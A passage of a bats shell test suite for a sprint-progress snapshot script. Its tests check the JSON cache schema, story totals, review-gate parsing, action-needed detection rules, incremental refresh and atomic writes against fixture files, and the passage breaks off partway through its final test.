#!/usr/bin/env bats
# sprint-progress-snapshot.bats — core functional tests for the sprint progress
# snapshot script: cache schema, totals, by-status counts, phases, per-story
# detail, detection rules, incremental refresh, and edge cases.

# bats file_tags=sprint-progress

load 'test_helper.bash'

bats_require_minimum_version 1.5.0

setup() {
  common_setup
  SCRIPT="$(snapshot_script_under_test "$SCRIPTS_DIR/sprint-progress-snapshot.sh")"

  # Fixture tree: mimic a .gaia project layout inside TEST_TMP
  export PROJECT_ROOT="$TEST_TMP/project"
  mkdir -p "$PROJECT_ROOT/.gaia/state"
  mkdir -p "$PROJECT_ROOT/.gaia/config"

  IMPL="$PROJECT_ROOT/.gaia/artifacts/implementation-artifacts"
  mkdir -p "$IMPL"
  CACHE="$PROJECT_ROOT/.gaia/state/.sprint-progress-cache.json"
  SIDECAR="$PROJECT_ROOT/.gaia/state/.sprint-progress-mtimes"
  export SPRINT_STATUS_YAML="$PROJECT_ROOT/.gaia/state/sprint-status.yaml"
}
teardown() {
  if [ -n "${READER_PID:-}" ]; then kill "$READER_PID" 2>/dev/null || true; fi
  common_teardown
}

# ---------------------------------------------------------------------------
# Fixture helpers
# ---------------------------------------------------------------------------

# write_sprint_yaml — seed sprint-status.yaml with given stories.
# Usage: write_sprint_yaml [status] [start_date] [end_date] [key:status:points:phase] ...
# Hand-written because sprint-state.sh init requires a non-existent yaml
# and inject requires a matching frontmatter — overkill for cache tests.
write_sprint_yaml() {
  local sprint_status="${1:-active}"; shift || true
  local start_date="${1:-2026-10-01}"; shift || true
  local end_date="${1:-2026-10-14}"; shift || true
  cat > "$SPRINT_STATUS_YAML" <<EOF
sprint_id: "sprint-test"
status: ${sprint_status}
start_date: "${start_date}"
end_date: "${end_date}"
total_points: 0
velocity_capacity: 100
goals:
  - "Ship the cache"
stories:
EOF
  local total_pts=0
  for row in "$@"; do
    local key status pts phase risk blocked_by
    key="$(echo "$row" | cut -d: -f1)"
    status="$(echo "$row" | cut -d: -f2)"
    pts="$(echo "$row" | cut -d: -f3)"
    pts="${pts:-5}"
    phase="$(echo "$row" | cut -d: -f4)"
    risk="$(echo "$row" | cut -d: -f5)"
    risk="${risk:-medium}"
    blocked_by="$(echo "$row" | cut -d: -f6)"
    cat >> "$SPRINT_STATUS_YAML" <<EOF
  - key: "${key}"
    title: "Story ${key}"
    status: "${status}"
    points: ${pts}
    risk_level: "${risk}"
    assignee: null
    blocked_by: ${blocked_by:-null}
    updated: "2026-10-01"
EOF
    if [ -n "$phase" ]; then
      echo "    phase: ${phase}" >> "$SPRINT_STATUS_YAML"
    fi
    total_pts=$((total_pts + pts))
  done
  # Patch total_points
  sed "s/^total_points: 0/total_points: ${total_pts}/" "$SPRINT_STATUS_YAML" > "${SPRINT_STATUS_YAML}.tmp" \
    && mv "${SPRINT_STATUS_YAML}.tmp" "$SPRINT_STATUS_YAML"
}

# write_story — create a story file under the per-story directory layout.
# Usage: write_story <key> <status> [points] [manual_verification] [extra_frontmatter]
write_story() {
  local key="$1" status="$2" pts="${3:-5}" manual_v="${4:-false}" extra="${5:-}"
  local slug
  slug="$(echo "$key" | tr '[:upper:]' '[:lower:]')-test-story"
  local dir="$IMPL/epic-test/${key}-${slug}"
  mkdir -p "$dir"
  cat > "$dir/story.md" <<EOF
---
template: 'story'
key: "${key}"
title: "Story ${key}"
status: ${status}
points: ${pts}
manual_verification: ${manual_v}
depends_on: []
${extra}
---

# Story: ${key}

> **Status:** ${status}

## Tasks / Subtasks

- [x] Task 1: Build the widget
- [ ] Task 2: Wire the integration
- [x] Task 3: Write tests

## Review Gate

| Review | Status | Report |
|--------|--------|--------|
| Code Review | PASSED | — |
| QA Tests | PASSED | — |
| Security Review | PASSED | — |
| Test Automation | PASSED | — |
| Test Review | PASSED | — |
| Performance Review | PASSED | — |

## Definition of Done

- [x] All done
EOF
  printf '%s' "$dir/story.md"
}

# write_story_with_gates — story with configurable gate statuses.
write_story_with_gates() {
  local key="$1" status="$2" pts="${3:-5}" manual_v="${4:-false}"
  local cr="${5:-PASSED}" qa="${6:-PASSED}" sec="${7:-PASSED}" ta="${8:-PASSED}" tr="${9:-PASSED}" pr="${10:-PASSED}"
  local slug
  slug="$(echo "$key" | tr '[:upper:]' '[:lower:]')-gated"
  local dir="$IMPL/epic-test/${key}-${slug}"
  mkdir -p "$dir"
  cat > "$dir/story.md" <<EOF
---
template: 'story'
key: "${key}"
title: "Story ${key}"
status: ${status}
points: ${pts}
manual_verification: ${manual_v}
depends_on: []
---

# Story: ${key}

> **Status:** ${status}

## Tasks / Subtasks

- [x] Task 1: Do something

## Review Gate

| Review | Status | Report |
|--------|--------|--------|
| Code Review | ${cr} | — |
| QA Tests | ${qa} | — |
| Security Review | ${sec} | — |
| Test Automation | ${ta} | — |
| Test Review | ${tr} | — |
| Performance Review | ${pr} | — |

## Definition of Done

- [x] All done
EOF
  printf '%s' "$dir/story.md"
}

# write_action_items — create an action-items.yaml registry.
write_action_items() {
  local path="$PROJECT_ROOT/.gaia/state/action-items.yaml"
  cat > "$path"
}

# write_project_config — write project-config.yaml with optional aliases.
write_project_config() {
  local config="$PROJECT_ROOT/.gaia/config/project-config.yaml"
  cat > "$config"
}

# write_ledger_row — append a review-gate ledger row (TSV format).
write_ledger_row() {
  local key="$1" gate="$2" plan_id="$3" verdict="$4"
  local ledger="$PROJECT_ROOT/.gaia/state/.review-gate-ledger"
  mkdir -p "$(dirname "$ledger")"
  printf '%s\t%s\t%s\t%s\n' "$key" "$gate" "$plan_id" "$verdict" >> "$ledger"
}

# ---------------------------------------------------------------------------
# Schema and field tests
# ---------------------------------------------------------------------------

@test "cache output matches documented schema with all required fields" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" \
    "E900-S1:done:10:1:high" "E900-S2:in-progress:8:1:medium" \
    "E900-S3:review:5:2:low" "E900-S4:blocked:3:2:medium:E900-S2" \
    "E900-S5:ready-for-dev:4::low"
  write_story E900-S1 done 10 false
  write_story E900-S2 in-progress 8 true
  write_story E900-S3 review 5 false
  write_story E900-S4 blocked 3 false
  write_story E900-S5 ready-for-dev 4 false

  run "$SCRIPT"
  [ "$status" -eq 0 ]

  # Validate top-level keys
  [ "$(jq -r '.schema_version' "$CACHE")" = "1.0" ]
  jq -e '.generated_at' "$CACHE"
  jq -e '.sprint.id' "$CACHE"
  jq -e '.sprint.goal' "$CACHE"
  jq -e '.sprint.start_date' "$CACHE"
  jq -e '.sprint.end_date' "$CACHE"
  jq -e '.sprint.status' "$CACHE"
  jq -e '.sprint | has("total_days")' "$CACHE"
  jq -e '.totals.done_points' "$CACHE"
  jq -e '.totals.total_points' "$CACHE"
  jq -e '.totals.done_stories' "$CACHE"
  jq -e '.totals.total_stories' "$CACHE"
  jq -e '.totals | has("progress_pct")' "$CACHE"
  jq -e '.by_status' "$CACHE"
  jq -e '.day | has("current")' "$CACHE"
  jq -e '.day | has("total")' "$CACHE"
  jq -e '.day | has("pace")' "$CACHE"
  jq -e 'has("active_phase")' "$CACHE"
  jq -e 'has("phases")' "$CACHE"
  jq -e 'has("unphased_stories")' "$CACHE"
  jq -e '.stories | length == 5' "$CACHE"
  jq -e 'has("action_needed")' "$CACHE"
  jq -e 'has("drift")' "$CACHE"
  jq -e '.readiness | has("sprint_review")' "$CACHE"
  jq -e '.readiness | has("sprint_close")' "$CACHE"
  jq -e 'has("user_aliases")' "$CACHE"
  # No agent_activity key
  jq -e 'has("agent_activity") | not' "$CACHE"

  # Per-story detail: tasks, gates, manual_test
  jq -e '.stories[0].tasks | has("done", "total", "items")' "$CACHE"
  jq -e '.stories[0].gates | has("passed", "total", "rows")' "$CACHE"
  jq -e '.stories[0].gates.total == 6' "$CACHE"
  jq -e '.stories[0].manual_test | has("required", "verdict")' "$CACHE"

}

@test "sprint totals correctly computed from fixture stories" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" \
    "E900-S1:done:13" "E900-S2:done:8" "E900-S3:in-progress:5"
  write_story E900-S1 done 13
  write_story E900-S2 done 8
  write_story E900-S3 in-progress 5

  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq '.totals.done_points' "$CACHE")" = "21" ]
  [ "$(jq '.totals.total_points' "$CACHE")" = "26" ]
  [ "$(jq '.totals.done_stories' "$CACHE")" = "2" ]
  [ "$(jq '.totals.total_stories' "$CACHE")" = "3" ]
  [ "$(jq '.totals.progress_pct' "$CACHE")" = "80" ]
}

@test "by-status counts match story statuses" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" \
    "E900-S1:done:5" "E900-S2:done:5" \
    "E900-S3:in-progress:3" "E900-S4:review:4" "E900-S5:blocked:2"
  write_story E900-S1 done 5
  write_story E900-S2 done 5
  write_story E900-S3 in-progress 3
  write_story E900-S4 review 4
  write_story E900-S5 blocked 2

  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq '.by_status.done.count' "$CACHE")" = "2" ]
  [ "$(jq '.by_status.done.points' "$CACHE")" = "10" ]
  [ "$(jq '.by_status["in-progress"].count' "$CACHE")" = "1" ]
  [ "$(jq '.by_status.review.count' "$CACHE")" = "1" ]
  [ "$(jq '.by_status.blocked.count' "$CACHE")" = "1" ]
}

@test "phases array shows done active future with correct active_phase" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" \
    "E900-S1:done:5:1" "E900-S2:done:5:1" \
    "E900-S3:in-progress:3:2" "E900-S4:ready-for-dev:4:3" \
    "E900-S5:backlog:2"
  write_story E900-S1 done 5
  write_story E900-S2 done 5
  write_story E900-S3 in-progress 3
  write_story E900-S4 ready-for-dev 4
  write_story E900-S5 backlog 2

  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq '.phases | length' "$CACHE")" = "3" ]
  [ "$(jq '.phases[0].status' "$CACHE")" = '"done"' ]
  [ "$(jq '.phases[1].status' "$CACHE")" = '"active"' ]
  [ "$(jq '.phases[2].status' "$CACHE")" = '"future"' ]
  [ "$(jq '.active_phase' "$CACHE")" = "2" ]
  [ "$(jq '.unphased_stories | length' "$CACHE")" = "1" ]
  [ "$(jq '.unphased_stories[0]' "$CACHE")" = '"E900-S5"' ]
}

@test "per-story fields include tasks items gates rows manual_test blocked_since" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" \
    "E900-S1:blocked:8:1:high:E900-S2"
  local sf
  sf="$(write_story E900-S1 blocked 8 true)"
  # Set a known mtime for blocked_since
  touch -t 202610050000 "$sf"

  run "$SCRIPT"
  [ "$status" -eq 0 ]
  local s
  s="$(jq '.stories[0]' "$CACHE")"
  [ "$(echo "$s" | jq -r '.key')" = "E900-S1" ]
  [ "$(echo "$s" | jq -r '.status')" = "blocked" ]
  [ "$(echo "$s" | jq '.points')" = "8" ]
  [ "$(echo "$s" | jq -r '.risk_level')" = "high" ]
  [ "$(echo "$s" | jq -r '.blocked_by')" = "E900-S2" ]
  [ "$(echo "$s" | jq -r '.blocked_since')" = "2026-10-05" ]
  # Tasks: 2 done out of 3
  [ "$(echo "$s" | jq '.tasks.done')" = "2" ]
  [ "$(echo "$s" | jq '.tasks.total')" = "3" ]
  [ "$(echo "$s" | jq '.tasks.items | length')" = "3" ]
  # Gates: all 6 PASSED
  [ "$(echo "$s" | jq '.gates.passed')" = "6" ]
  [ "$(echo "$s" | jq '.gates.total')" = "6" ]
  [ "$(echo "$s" | jq '.gates.rows | length')" = "6" ]
  [ "$(echo "$s" | jq -r '.gates.rows[0].name')" = "Code Review" ]
  # Manual test
  [ "$(echo "$s" | jq '.manual_test.required')" = "true" ]
}

# ---------------------------------------------------------------------------
# Detection rules
# ---------------------------------------------------------------------------

@test "detection rule a fires when manual test is due" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:review:5"
  write_story_with_gates E900-S1 review 5 true \
    PASSED PASSED PASSED PASSED PASSED PASSED

  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq '[.action_needed[] | select(.rule == "a")] | length' "$CACHE")" = "1" ]
  [ "$(jq -r '.action_needed[0].type' "$CACHE")" = "manual_test_due" ]
  [ "$(jq -r '.action_needed[0].command' "$CACHE")" = "/gaia-test-manual" ]
  [ "$(jq -r '.action_needed[0].source' "$CACHE")" = "story-file" ]
  [ "$(jq -r '.action_needed[0].story_keys[0]' "$CACHE")" = "E900-S1" ]
}

@test "detection rule a does not fire on negative cases" {
  # Case 1: 5/6 gates passed
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:review:5"
  write_story_with_gates E900-S1 review 5 true \
    PASSED PASSED PASSED PASSED PASSED UNVERIFIED

  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq '[.action_needed[] | select(.rule == "a")] | length' "$CACHE")" = "0" ]

  # Case 2: required false
  rm -rf "$IMPL"/*
  mkdir -p "$IMPL"
  write_story_with_gates E900-S1 review 5 false \
    PASSED PASSED PASSED PASSED PASSED PASSED

  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq '[.action_needed[] | select(.rule == "a")] | length' "$CACHE")" = "0" ]

  # Case 3: verdict PASSED — write a ledger row
  rm -rf "$IMPL"/*
  mkdir -p "$IMPL"
  write_story_with_gates E900-S1 review 5 true \
    PASSED PASSED PASSED PASSED PASSED PASSED
  write_ledger_row E900-S1 manual-test plan-1 PASSED

  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq '[.action_needed[] | select(.rule == "a")] | length' "$CACHE")" = "0" ]

  # Case 4: status done
  rm -rf "$IMPL"/*
  mkdir -p "$IMPL"
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:done:5"
  write_story_with_gates E900-S1 done 5 true \
    PASSED PASSED PASSED PASSED PASSED PASSED

  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq '[.action_needed[] | select(.rule == "a")] | length' "$CACHE")" = "0" ]
}

@test "detection rule c fires for open action item assigned to alias" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:in-progress:5"
  write_story E900-S1 in-progress 5
  write_action_items <<'YAML'
items:
  - id: "AI-901"
    title: "Check the deploy logs"
    status: "open"
    assignee: "user"
    created_at: "2026-10-02"
  - id: "AI-902"
    title: "Resolved item"
    status: "resolved"
    assignee: "user"
    created_at: "2026-10-02"
YAML

  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq '[.action_needed[] | select(.rule == "c")] | length' "$CACHE")" = "1" ]
  [ "$(jq -r '.action_needed[] | select(.rule == "c") | .item_id' "$CACHE")" = "AI-901" ]
  [ "$(jq -r '.action_needed[] | select(.rule == "c") | .command' "$CACHE")" = "/gaia-action-items" ]
  [ "$(jq -r '.action_needed[] | select(.rule == "c") | .source' "$CACHE")" = "action-items" ]
}

@test "detection rule c matches alias case-insensitively" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:in-progress:5"
  write_story E900-S1 in-progress 5
  write_project_config <<'YAML'
sprint_status_mod:
  user_aliases:
    - "Julien"
YAML
  write_action_items <<'YAML'
items:
  - id: "AI-903"
    title: "Fix the thing"
    status: "in-progress"
    assignee: "julien"
    created: "2026-10-03"
YAML

  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq '[.action_needed[] | select(.rule == "c")] | length' "$CACHE")" = "1" ]
}

@test "detection rule c tolerates unparseable action-items registry" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:in-progress:5"
  write_story E900-S1 in-progress 5
  # Deliberately malformed YAML (indentation defect)
  write_action_items <<'YAML'
items:
- id: "AI-904"
  title: "Bad indent"
    status: "open"
  assignee: "user"
YAML

  run "$SCRIPT"
  [ "$status" -eq 0 ]
  # Should write valid cache with no rule-c items
  jq -e '.' "$CACHE"
  [ "$(jq '[.action_needed[] | select(.rule == "c")] | length' "$CACHE")" = "0" ]
}

@test "detection rule d fires when all stories done in active sprint" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" \
    "E900-S1:done:5" "E900-S2:done:8"
  write_story E900-S1 done 5
  write_story E900-S2 done 8

  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq '[.action_needed[] | select(.rule == "d")] | length' "$CACHE")" = "1" ]
  [ "$(jq -r '.action_needed[] | select(.rule == "d") | .type' "$CACHE")" = "sprint_can_close" ]
  [ "$(jq -r '.action_needed[] | select(.rule == "d") | .command' "$CACHE")" = "/gaia-sprint-close" ]
  [ "$(jq -r '.action_needed[] | select(.rule == "d") | .source' "$CACHE")" = "sprint-status" ]
}

@test "user alias list defaults and config override" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:in-progress:5"
  write_story E900-S1 in-progress 5

  # Default includes "user"
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  jq -e '.user_aliases | index("user")' "$CACHE"

  # Config override replaces default
  write_project_config <<'YAML'
sprint_status_mod:
  user_aliases:
    - "alice"
    - "bob"
YAML
  rm -f "$CACHE" "$SIDECAR"
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq '.user_aliases | length' "$CACHE")" = "2" ]
  jq -e '.user_aliases | index("alice")' "$CACHE"
  jq -e '.user_aliases | index("bob")' "$CACHE"
}

@test "since-date derived from story file mtime not updated field" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:review:5"
  local sf
  sf="$(write_story_with_gates E900-S1 review 5 true \
    PASSED PASSED PASSED PASSED PASSED PASSED)"
  touch -t 202610080000 "$sf"

  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq -r '.action_needed[0].since' "$CACHE")" = "2026-10-08" ]
  # Source code must not derive since from the updated: field
  run grep -c 'updated:' "$SCRIPT"
  [ "$output" = "0" ]

  # Behavioural check: a story with an updated: frontmatter date different from
  # its mtime should use the mtime date, not the updated: date.
  rm -rf "$IMPL"/*
  mkdir -p "$IMPL"
  rm -f "$CACHE" "$SIDECAR"
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S2:review:5"
  local sf2
  sf2="$(write_story_with_gates E900-S2 review 5 true \
    PASSED PASSED PASSED PASSED PASSED PASSED)"
  # Inject an updated: field in the frontmatter with a different date
  sed 's/^depends_on: \[\]/depends_on: []\nupdated: "2026-09-01"/' "$sf2" > "${sf2}.tmp" && mv "${sf2}.tmp" "$sf2"
  # Set mtime to a different date
  touch -t 202610090000 "$sf2"

  run "$SCRIPT"
  [ "$status" -eq 0 ]
  # since should equal the mtime date (2026-10-09), NOT the updated: field (2026-09-01)
  [ "$(jq -r '.action_needed[0].since' "$CACHE")" = "2026-10-09" ]
}

@test "mtime-incremental skips unchanged files recomputes time-derived" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" \
    "E900-S1:done:5" "E900-S2:in-progress:8"
  write_story E900-S1 done 5
  write_story E900-S2 in-progress 8

  # Cold run
  backdate_tree
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ -f "$SIDECAR" ]
  local gen1
  gen1="$(jq -r '.generated_at' "$CACHE")"

  # Warm run — no files changed; generated_at must still update
  sleep 1
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  local gen2
  gen2="$(jq -r '.generated_at' "$CACHE")"
  [ "$gen1" != "$gen2" ]
}

@test "atomic write via mktemp mv produces complete JSON" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:done:5"
  write_story E900-S1 done 5

  run "$SCRIPT"
  [ "$status" -eq 0 ]
  # The file must be valid JSON
  jq -e '.' "$CACHE"
  # No tmp files should remain
  local leftover
  leftover="$(find "$PROJECT_ROOT/.gaia/state" -name '*.tmp.*' 2>/dev/null)"
  [ -z "$leftover" ]
}

# ---------------------------------------------------------------------------
# Edge cases
# ---------------------------------------------------------------------------

@test "zero-point sprint produces valid cache no NaN no Infinity" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" \
    "E900-S1:done:0" "E900-S2:in-progress:0"
  write_story E900-S1 done 0
  write_story E900-S2 in-progress 0

  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq '.totals.progress_pct' "$CACHE")" = "0" ]
  # No NaN or Infinity anywhere in the cache
  run grep -ciE 'nan|infinity' "$CACHE"
  [ "$output" = "0" ]
}

@test "empty stories list produces valid cache no rule-d" {
  write_sprint_yaml active "2026-10-01" "2026-10-14"
  # No stories

  run "$SCRIPT"
  [ "$status" -eq 0 ]
  jq -e '.' "$CACHE"
  [ "$(jq '.totals.total_stories' "$CACHE")" = "0" ]
  [ "$(jq '.stories | length' "$CACHE")" = "0" ]
  [ "$(jq '.phases | length' "$CACHE")" = "0" ]
  [ "$(jq '.readiness.sprint_close' "$CACHE")" = "false" ]
  [ "$(jq '[.action_needed[] | select(.rule == "d")] | length' "$CACHE")" = "0" ]
}

@test "missing story file mid-read skipped gracefully" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" \
    "E900-S1:done:5" "E900-S2:in-progress:8"
  write_story E900-S1 done 5
  # E900-S2 referenced in yaml but file does not exist

  run "$SCRIPT"
  [ "$status" -eq 0 ]
  jq -e '.' "$CACHE"
  # Only E900-S1 should appear in stories[]
  [ "$(jq '.stories | length' "$CACHE")" = "1" ]
  [ "$(jq -r '.stories[0].key' "$CACHE")" = "E900-S1" ]
}

@test "closed sprint writes sprint.status closed not sprint null" {
  write_sprint_yaml closed "2026-10-01" "2026-10-14" "E900-S1:done:5"
  write_story E900-S1 done 5

  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq -r '.sprint.status' "$CACHE")" = "closed" ]
  [ "$(jq '.sprint' "$CACHE")" != "null" ]
  # No rule-d for closed sprint
  [ "$(jq '[.action_needed[] | select(.rule == "d")] | length' "$CACHE")" = "0" ]
}

@test "concurrent reader sees complete JSON never partial" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:done:5"
  write_story E900-S1 done 5 >/dev/null

  # Pre-seed a valid cache
  run "$SCRIPT"
  [ "$status" -eq 0 ]

  # Slow the writer down: the cold assembly marks that a build is in flight
  # and takes 0.4 s, so the reader is guaranteed to read while it runs.
  local stub="$TEST_TMP/stub-bin"; mkdir -p "$stub"
  local real_jq; real_jq="$(command -v jq)"
  cat > "$stub/jq" <<SH
#!/usr/bin/env bash
case "\$*" in *'inputs | split'*) : > "$TEST_TMP/building"; sleep 0.4 ;; esac
exec "$real_jq" "\$@"
SH
  chmod +x "$stub/jq"

  # Reader: reads continuously until the writer is done, logging only the
  # reads taken while a build was in flight.
  local reader_log="$TEST_TMP/reader.log"
  # The loop also stops on its own after about 60 s, so a failed assertion
  # below can never leave it polling.
  (
    n=0
    while [ ! -e "$TEST_TMP/writer-done" ] && [ "$n" -lt 3000 ]; do
      if [ -e "$TEST_TMP/building" ]; then
        if jq -e '.' "$CACHE" >/dev/null 2>&1; then echo "ok"; else echo "PARTIAL"; fi
      fi
      n=$((n + 1))
      sleep 0.02
    done > "$reader_log"
  ) &
  local reader_pid=$!
  # teardown stops the reader too, when an assertion below fails first.
  READER_PID="$reader_pid"

  # Three cold rebuilds (the sidecar is removed each time), each replacing
  # the cache while the reader runs.
  local i
  for i in 1 2 3; do
    rm -f "$SIDECAR"
    PATH="$stub:$PATH" run "$SCRIPT"
    [ "$status" -eq 0 ]
  done
  : > "$TEST_TMP/writer-done"
  wait "$reader_pid" 2>/dev/null || true

  # Overlap is proven, not assumed: reads happened during the builds.
  [ "$(grep -c '^ok$' "$reader_log")" -ge 3 ]
  [ "$(grep -c 'PARTIAL' "$reader_log")" = "0" ]
}

@test "rule a and rule c coexist ordered correctly" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:review:5"
  write_story_with_gates E900-S1 review 5 true \
    PASSED PASSED PASSED PASSED PASSED PASSED
  write_action_items <<'YAML'
items:
  - id: "AI-905"
    title: "Check logs"
    status: "open"
    assignee: "user"
    created_at: "2026-10-02"
YAML

  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq '.action_needed | length' "$CACHE")" = "2" ]
  [ "$(jq -r '.action_needed[0].rule' "$CACHE")" = "a" ]
  [ "$(jq -r '.action_needed[1].rule' "$CACHE")" = "c" ]
}

@test "action entries are ordered by story key and item id numerically" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" \
    "E900-S10:review:5" "E900-S2:review:5" "E1000-S3:review:5"
  local k
  for k in E900-S10 E900-S2 E1000-S3; do
    write_story_with_gates "$k" review 5 true PASSED PASSED PASSED PASSED PASSED PASSED >/dev/null
  done
  write_action_items <<'YAML'
items:
  - id: "AI-9100"
    status: "open"
    assignee: "user"
    created_at: "2026-10-02"
  - id: "AI-90001"
    status: "open"
    assignee: "user"
    created_at: "2026-10-02"
  - id: "AI-9001"
    status: "open"
    assignee: "user"
    created_at: "2026-10-02"
YAML
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  # Plain string order would give E1000-S3 first, E900-S10 before E900-S2, and
  # AI-90001 before AI-9100.
  [ "$(jq -c '[.action_needed[] | select(.rule == "a") | .story_keys[0]]' "$CACHE")" = '["E900-S2","E900-S10","E1000-S3"]' ]
  [ "$(jq -c '[.action_needed[] | select(.rule == "c") | .item_id]' "$CACHE")" = '["AI-9001","AI-9100","AI-90001"]' ]
  [ "$(jq -c '[.action_needed[].rule]' "$CACHE")" = '["a","a","a","c","c","c"]' ]
}

@test "rule c and rule d coexist ordered correctly" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" \
    "E900-S1:done:5" "E900-S2:done:8"
  write_story E900-S1 done 5
  write_story E900-S2 done 8
  write_action_items <<'YAML'
items:
  - id: "AI-906"
    title: "Deploy config"
    status: "in-progress"
    assignee: "user"
    created_at: "2026-10-02"
YAML

  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq '.action_needed | length' "$CACHE")" = "2" ]
  [ "$(jq -r '.action_needed[0].rule' "$CACHE")" = "c" ]
  [ "$(jq -r '.action_needed[1].rule' "$CACHE")" = "d" ]
}

@test "deleted mtime sidecar triggers cold run" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:done:5"
  write_story E900-S1 done 5

  # Cold run — creates sidecar
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ -f "$SIDECAR" ]

  # Delete sidecar
  rm -f "$SIDECAR"

  # Re-run — should produce valid cache without sidecar
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  jq -e '.' "$CACHE"
  [ -f "$SIDECAR" ]
}

@test "backward mtime triggers re-parse" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:in-progress:5"
  local sf
  sf="$(write_story E900-S1 in-progress 5)"
  backdate_tree

  # Cold run, then prove the next run is warm (it keeps a planted marker).
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  expect_warm_next

  # Move the mtime BACKWARD only (simulates a git checkout): the warm path
  # must treat it as a change and rebuild, which drops the marker.
  touch -t 202501010000 "$sf"
  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq -r '.stories[0].title' "$CACHE")" = "Story E900-S1" ]
}

@test "missing review-gate ledger yields gates from story table and verdict null" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:review:5"
  write_story_with_gates E900-S1 review 5 true \
    PASSED PASSED PASSED PASSED PASSED PASSED
  # No ledger file exists — verdict should be null

  run "$SCRIPT"
  [ "$status" -eq 0 ]
  [ "$(jq '.stories[0].gates.passed' "$CACHE")" = "6" ]
  [ "$(jq '.stories[0].gates.total' "$CACHE")" = "6" ]
  [ "$(jq '.stories[0].manual_test.verdict' "$CACHE")" = "null" ]
}

@test "absent or unparseable review gate table yields default gates with stderr warning" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:in-progress:5"
  # Story with NO Review Gate table at all
  local slug="e900-s1-no-gate"
  local dir="$IMPL/epic-test/E900-S1-${slug}"
  mkdir -p "$dir"
  cat > "$dir/story.md" <<'EOF'
---
template: 'story'
key: "E900-S1"
title: "No gate table"
status: in-progress
points: 5
manual_verification: false
depends_on: []
---

# Story: No gate table

> **Status:** in-progress

## Tasks / Subtasks

- [ ] Task 1: Something

## Definition of Done

- [ ] All done
EOF

  run "$SCRIPT"
  [ "$status" -eq 0 ]
  jq -e '.' "$CACHE"
  [ "$(jq '.stories[0].gates.passed' "$CACHE")" = "0" ]
  [ "$(jq '.stories[0].gates.total' "$CACHE")" = "6" ]
  [ "$(jq '.stories[0].gates.rows | length' "$CACHE")" = "0" ]
}

@test "legacy NOT STARTED gate value maps to UNVERIFIED" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:in-progress:5"
  local slug="e900-s1-legacy-gate"
  local dir="$IMPL/epic-test/E900-S1-${slug}"
  mkdir -p "$dir"
  cat > "$dir/story.md" <<'EOF'
---
template: 'story'
key: "E900-S1"
title: "Legacy gate"
status: in-progress
points: 5
manual_verification: false
depends_on: []
---

# Story: Legacy gate

> **Status:** in-progress

## Tasks / Subtasks

- [ ] Task 1: Something

## Review Gate

| Review | Status | Report |
|--------|--------|--------|
| Code Review | PASSED | — |
| QA Tests | NOT STARTED | — |
| Security Review | PASSED | — |
| Test Automation | PASSED | — |
| Test Review | NOT STARTED | — |
| Performance Review | PASSED | — |

## Definition of Done

- [ ] All done
EOF

  run "$SCRIPT"
  [ "$status" -eq 0 ]
  # NOT STARTED should be mapped to UNVERIFIED
  [ "$(jq -r '.stories[0].gates.rows[] | select(.name == "QA Tests") | .status' "$CACHE")" = "UNVERIFIED" ]
  [ "$(jq -r '.stories[0].gates.rows[] | select(.name == "Test Review") | .status' "$CACHE")" = "UNVERIFIED" ]
  [ "$(jq '.stories[0].gates.passed' "$CACHE")" = "4" ]
}

@test "missing action-items registry yields no rule-c" {
  write_sprint_yaml active "2026-10-01" "2026-10-14" "E900-S1:in-progress:5"
  write_story E900-S1 in-progress 5
  # No action-items.yaml at all

